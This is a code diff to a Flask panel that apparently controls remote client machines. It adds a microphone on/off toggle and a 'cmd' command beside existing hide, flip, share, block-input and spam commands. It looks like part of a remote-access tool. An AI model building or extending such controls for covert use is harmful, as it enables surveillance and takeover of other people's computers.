@@ -46,7 +46,11 @@ with open(state_file,"w") as file:
             "INToggleState": {
             	"state": "off",
             	"color": "red"
-            }            
+            },
+            "micToggleState": {
+            	"state": "off",
+            	"color": "red"
+            }                        
         }
     json.dump(states, file, indent=4)			
 @app.route("/")
@@ -76,6 +80,8 @@ def root():
     shc = data1[selected_user]["shareToggleState"]["color"]
     is1 = data1[selected_user]["INToggleState"]["state"]
     ic = data1[selected_user]["INToggleState"]["color"]
+    ms = data1[selected_user]["micToggleState"]["state"]
+    mc = data1[selected_user]["micToggleState"]["color"]
     if not firstReload:
         if time() - startTime <= 2.5:
             state = "Online"
@@ -89,7 +95,7 @@ def root():
     else:
         data = {"tasks": []}
     firstReload = False       
-    return render_template("index.html", state=state if state else "Offline", files=files,images=images,videos=videos, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,ic=ic,is1=is1,users=users,selected = selected)
+    return render_template("index.html", state=state if state else "Offline", files=files,images=images,videos=videos, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,ic=ic,is1=is1,mc=mc,ms=ms,users=users,selected = selected)
 
 @app.route("/edit", methods=["POST", "GET"])
 def edit():
@@ -295,11 +301,14 @@ def toggle():
                 data[selected_user]["shareToggleState"]["color"] = color
             elif cmd == "bLoCk":
                 data[selected_user]["INToggleState"]["state"] = state
-                data[selected_user]["INToggleState"]["color"] = color               
+                data[selected_user]["INToggleState"]["color"] = color
+            elif cmd == "mIc":
+                data[selected_user]["micToggleState"]["state"] = state
+                data[selected_user]["micToggleState"]["color"] = color                                             
             with open(state_file, "w") as file:
                 json.dump(data, file, indent=4)
         
-        if cmd == "hIdE" or cmd == "fLiP" or cmd == "sHaRe" or cmd == "bLoCk":
+        if cmd == "hIdE" or cmd == "fLiP" or cmd == "sHaRe" or cmd == "bLoCk" or cmd == "mIc":
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                 file.write(f"{cmd} {state}")
         elif cmd == "sPaM":
@@ -505,7 +514,8 @@ def cmd():
 			"play":"pLaY",
 			"img":"iMaGe",
 			"vid":"vIdEo",
-			"err":"eRr"
+			"err":"eRr",
+			"cmd":"cMd"
 		}
 		msg = (request.get_data().decode("utf-8")).split(" ")
 		com = commands[msg[0]]
